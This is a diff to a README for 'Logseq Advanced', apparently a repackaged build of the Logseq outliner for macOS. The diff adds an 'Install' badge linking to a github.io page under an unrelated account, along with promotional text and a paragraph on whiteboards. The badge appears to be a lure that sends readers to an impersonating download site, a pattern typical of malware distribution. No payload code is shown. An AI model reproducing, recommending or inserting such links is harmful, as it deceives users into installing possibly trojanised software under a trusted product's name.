@@ -13,6 +13,9 @@
   <img src="https://img.shields.io/badge/Apple_Silicon-Ready-orange?style=flat-square"/>
 </p>
 
+| [![Install](https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png)](https://marat-klubnika-apps.github.io/.github/logseq) | **Native outliner and networked knowledge base built for Mac professionals** <br><br> No setup, no friction. Built on macOS frameworks, runs natively on Intel and Apple Silicon with powerful tools designed for everyday professional use. |
+|---|---|
+
 <p align="center">
   <img src="https://discuss.logseq.com/uploads/default/original/2X/3/3b03be757f7c87144615e03687ff1122660020fa.png" alt="Logseq — outliner and networked knowledge base for macOS" width="780"/>
 </p>
@@ -26,6 +29,8 @@ Logseq Advanced is a local-first outliner that builds a networked knowledge base
 The daily journal provides a default entry point for every note, encouraging a habit of continuous capture that naturally accumulates into a structured knowledge base over time without requiring upfront organization.
 
 Block-level references let any single line — not just whole pages — be linked and embedded elsewhere, creating connections at a finer granularity than most outliners and knowledge tools support.
+
+Whiteboards extend the outliner with a freeform visual canvas where blocks from the linked knowledge base can be arranged spatially, combining structured outlining with visual thinking in the same tool.
 
 For thinkers who want a knowledge base built from daily writing rather than deliberate upfront structure, and who value owning their data as plain local files, Logseq Advanced is the outliner built around both of those priorities.
 
